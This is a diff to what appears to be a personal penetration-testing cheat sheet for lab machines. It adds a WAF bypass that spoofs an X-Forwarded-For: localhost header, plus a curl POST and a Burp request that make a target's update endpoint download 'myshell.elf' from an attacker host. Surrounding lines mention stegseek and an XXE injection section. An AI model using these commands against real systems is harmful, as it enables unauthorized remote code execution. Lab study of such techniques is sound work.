@@ -243,6 +243,33 @@ git push origin master
 #### Stegnography
 > 1. ```bash stegseek doubletrouble.jpg```
 	
+#### Bypassing WAF by **X-Forwarded-For**
+> 1. ```bash X-Forwarded-For: localhost ```
+	
+### CURL via POST
+> 1. ```bash curl -XPOST http://192.168.198.134:13337/update -H 'Content-Type: application/json' -d '{"user":"test","url":"http://192.168.49.19
+8:22/myshell.elf"}'```
+> 1. in BurpSuite
+```bash
+POST /update HTTP/1.1
+Host: 192.168.198.134:13337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 67
+Connection: close
+
+{
+
+	"user":"clumsyadmin",
+	"url":"http://192.168.49.198:22/myshell.elf"
+
+}	
+```
+	
+
 #### XXE injection
 ```bash
 <?xml  version="1.0" encoding="ISO-8859-1"?>
